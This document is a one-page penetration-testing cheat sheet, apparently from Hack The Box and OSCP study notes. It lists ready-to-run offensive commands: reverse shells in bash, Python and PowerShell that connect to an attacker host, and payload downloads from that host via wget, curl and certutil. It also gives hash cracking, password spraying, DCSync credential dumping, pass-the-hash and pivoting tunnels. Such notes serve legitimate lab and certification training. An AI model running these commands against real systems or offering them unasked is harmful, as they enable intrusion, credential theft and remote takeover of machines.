# ⚡ Master Cheatsheet

> **One page — top commands for every phase.** Print this or keep it open during machines.

---

## 🔧 Setup

```bash
export IP=<target>
mkdir -p ~/htb/<machine>/{nmap,web,exploits,loot}
```

---

## 🔍 Recon — Nmap

```bash
# Background full scan immediately
nmap -p- --min-rate 5000 $IP -oN nmap/alltcp.txt &

# Quick initial
nmap -sC -sV --top-ports 1000 $IP -oN nmap/initial.txt

# Targeted (once ports found)
nmap -sC -sV -p <ports> $IP -oN nmap/targeted.txt

# UDP
sudo nmap -sU --top-ports 100 $IP -oN nmap/udp.txt

# Vuln scripts
nmap --script vuln -p <ports> $IP
```

---

## 🌐 Web Enumeration

```bash
# Tech detection
whatweb http://$IP && curl -I http://$IP

# Directory fuzzing (fast → thorough)
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html,bak -o web/gobuster.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP/FUZZ -e .php,.txt,.html -mc 200,301,302,403

# Virtual hosts
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<domain>" -u http://$IP -fs <size>

# Check manually: /robots.txt  /.git/  /.env  /backup  /admin
```

---

## 📁 SMB

```bash
smbclient -L //$IP -N
smbmap -H $IP
enum4linux-ng -A $IP
nmap --script smb-vuln* -p 445 $IP
crackmapexec smb $IP -u <user> -p <pass> --shares
```

---

## 🔑 Password Attacks

```bash
# Identify hash
hashid '<hash>'

# Crack NTLM
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# Crack NTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Crack Kerberoast
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# Crack AS-REP
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

# SSH key crack
ssh2john id_rsa > id_rsa.hash && john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Hydra SSH
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://$IP

# Hydra HTTP form
hydra -l admin -P passwords.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Spray
crackmapexec smb $IP -u users.txt -p 'Password123!' --continue-on-success
```

---

## 💥 Exploitation

```bash
# Research
searchsploit <service> <version>
searchsploit -m <id>

# SQLMap
sqlmap -u "http://$IP/page?id=1" --batch --dbs
sqlmap -u "http://$IP/page?id=1" --batch -D db -T users --dump

# Listener
nc -nvlp 4444
rlwrap nc -nvlp 4444
```

---

## 💻 Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/<attacker>/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<attacker>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

---

## 🐚 Shell Upgrade (Linux)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter Enter
export TERM=xterm-256color; stty rows 40 columns 160
```

---

## ⬆️ Linux Privesc

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab && crontab -l
./linpeas.sh | tee /tmp/lp.txt
./pspy64           # Monitor processes
```

---

## 🪟 Windows Privesc

```cmd
whoami /all
whoami /priv
.\winPEAS.exe quiet
systeminfo | findstr /B "OS"
wmic qfe list brief
net users && net localgroup administrators
schtasks /query /fo LIST /v
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\"
```

---

## 🏛️ Active Directory

```bash
# Kerberoast
python3 GetUserSPNs.py <domain>/<user>:<pass> -dc-ip $IP -request -outputfile kerb.txt

# AS-REP
python3 GetNPUsers.py <domain>/<user>:<pass> -request -format hashcat -outputfile asrep.txt

# BloodHound collect
bloodhound-python -u <user> -p <pass> -d <domain> -ns $IP -c All

# DCSync
python3 secretsdump.py <domain>/<user>:<pass>@$IP -just-dc-ntlm

# PtH
python3 psexec.py -hashes :<hash> <domain>/<user>@$IP
crackmapexec smb $IP -u <user> -H <hash> -x "whoami"
```

---

## 🔄 Pivoting

```bash
# Chisel Server (attacker)
./chisel server -p 8080 --reverse

# Chisel Client (target)
./chisel client <attacker>:8080 R:socks

# Ligolo-ng Server (attacker)
sudo ./ligolo-ng-proxy -selfcert

# Ligolo-ng Client (target)
./ligolo-ng-agent -connect <attacker>:11601 -ignore-cert

# SSH tunnel (local port forward)
ssh -L 8080:127.0.0.1:80 user@$IP

# SSH SOCKS proxy
ssh -D 9050 user@$IP
```

---

## 📂 File Transfer

```bash
# Attacker serves files
python3 -m http.server 8000

# Linux target downloads
wget http://<attacker>:8000/file -O /tmp/file
curl http://<attacker>:8000/file -o /tmp/file

# Windows target downloads
certutil -urlcache -split -f http://<attacker>:8000/file.exe C:\Temp\file.exe
powershell -c "IWR http://<attacker>:8000/file.exe -OutFile C:\Temp\file.exe"

# SMB server (no HTTP needed)
python3 smbserver.py share . -smb2support
copy \\<attacker>\share\file.exe C:\Temp\
```

---

## 🏆 Flags

```bash
# Linux — find flags
find / -name "user.txt" -o -name "root.txt" 2>/dev/null

# Linux — OSCP proof screenshot
hostname && id && cat /root/proof.txt && ip a

# Windows — OSCP proof screenshot
hostname & whoami & type C:\Users\Administrator\Desktop\proof.txt & ipconfig
```

---

*[← Main README](../README.md) · [Tools Index →](./tools_index.md)*
